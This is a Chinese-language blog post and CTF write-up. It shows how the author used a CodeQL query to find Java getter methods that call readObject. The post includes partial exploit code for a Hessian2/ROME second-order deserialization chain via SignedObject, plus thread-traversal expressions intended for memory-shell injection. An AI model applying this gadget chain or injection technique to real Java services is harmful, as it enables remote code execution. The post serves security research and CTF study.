> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [firebasky.github.io](https://firebasky.github.io/2022/03/22/Codeql-excavate-Java-quadratic-deserialization/)

codeql挖掘java二次反序列化
==================

Firebasky 2022-03-22 [codeql](/tags/codeql/), [java](/tags/java/)

繁华的东方明珠，让我更加想念成都想念学校和家。（希望疫情好起来

![qd5jR1.jpg](https://s1.ax1x.com/2022/03/26/qd5jR1.jpg)

> 简单的说一下为什么要开始写博客，之前不写的原因有2个，第一个是特别懒不想去搭建，第二个是因为感觉自己写的东西都是重复别人大师傅的自己不配写一些精华的文章，这些都是我不想写的原因。但是自己还是想记录自己的生活和学习到的知识，所以就斗胆写下第一篇，希望保证每一篇都是《精华的?》
> 
> 这里也感谢我大哥帮我搭建博客。[atao](https://erroratao.github.io/)

[](#0x00-前言 "0x00 前言")0x00 前言
-----------------------------

前几天去打了2022hf比赛其中的java出的很好，更加像是真实环境中遇到的。比赛中没有想到了codeql去实现（工作忙，简单的使用了ast去分析了一下效果不太好。

这里也简单的介绍一下这个题的思路：大概是一个不出网的环境，Hessian2反序列化，rome链。本来想直接替换getter为TemplatesImpl，结果因为反序列化不了_tfactory失败。就开始了找gadgets之路。

[](#0x01-思考 "0x01 思考")0x01 思考
-----------------------------

针对这个题最好的办法是直接接着找getter方法看看有没有可以执行命令的，或者找有没有触发getter之后继续使用原生反序列化去继续利用起rome的原生反序列化。

[](#0x02-操作 "0x02 操作")0x02 操作
-----------------------------

所以我们来编写一下简单的codeql语句

<table><tbody><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br></pre></td><td class="code"><pre>/**<br> * @name jdk gadgets<br> * @kind path-problem<br> */<br>import java<br><br>/*找到可以序列化类，实现了Serializable接口 */<br>class Serializable extends Class{<br>  Serializable(){<br>    this.getASupertype() instanceof  TypeSerializable<br>  }<br>}<br><br>/**<br> * 危险方法<br> */<br>class SerializableMethod extends Method {<br>  SerializableMethod() {<br>    this.getDeclaringType() instanceof Serializable //<br>    and<br>    this.getName() = "readObject"<br>    }<br>}<br><br>class GetMethod extends Method{<br>  GetMethod(){<br>      this.getDeclaringType() instanceof Serializable and<br>      this.getName().indexOf("get") = 0 and<br>      this.getName().length() &gt; 3 and<br>      this.isPublic() and<br>      this.fromSource() and<br>      this.hasNoParameters()<br>  }<br>}<br><br>// 获得方法的内部调用.getBody().getAChild*() <br>from GetMethod getMethod, MethodAccess ma, Method method<br>where  ma.getEnclosingStmt() = getMethod.getBody().getAChild*() and method = ma.getMethod() and method.hasName("readObject")<br>select method,getMethod<br></pre></td></tr></tbody></table>

大概的意思是寻找getter方法中有调用readObject的方法。并且我这里定义了getter方法的类必须实现Serializable，其实对于Hessian2是不需要的。跑一下

[![qd5ba4.png](https://s1.ax1x.com/2022/03/26/qd5ba4.png)](https://imgtu.com/i/qd5ba4)

现在就来编写exp，其实就非常简单了，因为代码太多了，放出了核心代码。

<table><tbody><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br></pre></td><td class="code"><pre>//触发getObject 二次反序列化<br>KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DSA", "SUN");<br>SecureRandom random = SecureRandom.getInstance("SHA1PRNG", "SUN");<br>keyGen.initialize(1024, random);<br>PrivateKey signingKey = keyGen.generateKeyPair().getPrivate();<br>Signature signingEngine = Signature.getInstance("DSA");<br>signingEngine.initSign(signingKey);<br>SignedObject signedObject = new SignedObject((Serializable) Rome.getObject(),signingKey,signingEngine);<br><br>ToStringBean item = new ToStringBean(SignedObject.class, signedObject);<br>EqualsBean root = new EqualsBean(ToStringBean.class, item);<br>HashMap s = new HashMap&lt;&gt;();<br></pre></td></tr></tbody></table>

[](#0x03-扩展 "0x03 扩展")0x03 扩展
-----------------------------

其实后面的思路是别人告诉我的，getter方法也可以触发exec直接执行命令，大概是只能在linux下使用。

现在来想一想自己编写的codeql太简单了，没有使用污点分析。（可能存在好多误报，继续学习………

[](#0x04-不出网 "0x04 不出网")0x04 不出网
--------------------------------

之后是不出网，最开始是想到了使用写文件描述符fd实现回显示失败了，之后就想到了之前的内存木马都是通过当前线程获得的，那我们也可以找一下当前线程可能有利用的进行注入。

<table><tbody><tr><td class="gutter"><pre>1<br>2<br></pre></td><td class="code"><pre>(Thread.currentThread().group.threads[1].target.this$0.contexts.list.first.item.handler).getClass()<br>(Thread.currentThread().group.threads[1].target.this$0.rspConnections).getClass()<br></pre></td></tr></tbody></table>

[](#0x05-总结 "0x05 总结")0x05 总结
-----------------------------

合理的使用codeql应该可以会出现很多利用点继续学习了。

*   [首页](/)
*   [关于](/about/)
*   [归档](/archives/)
*   [项目](https://erroratao.github.io/)

1.  [1. 0x00 前言](#0x00-%E5%89%8D%E8%A8%80)
2.  [2. 0x01 思考](#0x01-%E6%80%9D%E8%80%83)
3.  [3. 0x02 操作](#0x02-%E6%93%8D%E4%BD%9C)
4.  [4. 0x03 扩展](#0x03-%E6%89%A9%E5%B1%95)
5.  [5. 0x04 不出网](#0x04-%E4%B8%8D%E5%87%BA%E7%BD%91)
6.  [6. 0x05 总结](#0x05-%E6%80%BB%E7%BB%93)

[菜单](#) [目录](#) [分享](#) [返回顶部](#)

Copyright © 2016-2022 Firebasky

*   [首页](/)
*   [关于](/about/)
*   [归档](/archives/)
*   [项目](https://erroratao.github.io/)